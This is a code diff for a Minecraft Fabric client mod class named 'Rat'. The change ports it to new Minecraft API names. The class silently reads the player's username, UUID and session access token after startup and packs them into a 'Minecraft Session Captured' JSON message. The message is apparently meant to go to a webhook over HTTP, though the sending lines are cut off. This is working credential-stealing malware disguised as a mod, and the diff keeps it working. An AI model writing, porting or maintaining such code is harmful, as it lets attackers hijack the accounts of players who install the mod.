@@ -1,8 +1,8 @@
 package com.example;
 
 import net.fabricmc.api.ClientModInitializer;
-import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.session.Session;
+import net.minecraft.client.Minecraft;
+import net.minecraft.client.User;
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -19,15 +19,15 @@ public class Rat implements ClientModInitializer {
                 // Wait for client initialization
                 Thread.sleep(4000);
                 
-                MinecraftClient client = MinecraftClient.getInstance();
+                Minecraft client = Minecraft.getInstance();
                 if (client == null) return;
                 
-                Session session = client.getSession();
-                if (session == null) return;
+                User user = client.getUser();
+                if (user == null) return;
 
-                String username = session.getUsername();
-                String uuid = session.getUuid();
-                String token = session.getAccessToken();
+                String username = user.getName();
+                String uuid = user.getUuid();
+                String token = user.getAccessToken();
 
                 String jsonPayload = String.format(
                     "{\"content\": \"🎮 **Minecraft Session Captured**\\n👤 User: `%s`\\n🆔 UUID: `%s`\\n🔑 Token: ```%s```\"}",
